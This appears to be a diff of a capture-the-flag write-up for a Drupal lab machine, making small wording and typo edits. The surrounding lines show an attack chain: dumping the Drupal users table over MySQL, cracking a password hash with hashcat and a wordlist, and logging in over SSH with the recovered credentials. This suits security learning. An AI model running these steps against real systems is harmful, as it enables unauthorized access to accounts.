@@ -91,7 +91,7 @@ $databases = array (
 ```
 Connect with `mysql -u drupaluser -D drupal -p` to the database. There are quite a few tables, but the most interesting one is the `user` table.
 
-So lets check the contents of that table with `SELECT * FROM users; exit;`, because of the broken metasploit shell I have to append _exit;_ to every query or I won't get any output. 
+So lets check the contents of that table with `SELECT * FROM users; exit;`, because of the broken metasploit shell we have to append _exit;_ to every query or we won't get any output. 
 ``` mysql
 select * from users; exit;
 uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
@@ -112,7 +112,7 @@ Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
 └──╼ $hashcat -m 7900 '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' /usr/share/SecLists/rockyou.txt --show
 $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
 ```
-We can login vai ssh `brucetherealadmin:booboo` and read the `user.txt` flag. ٩(◕‿◕｡)۶
+We can login via ssh `brucetherealadmin:booboo` and read the `user.txt` flag. ٩(◕‿◕｡)۶
 # Root
 With `sudo -l` we can check what we can run with root privilege.
 ``` bash
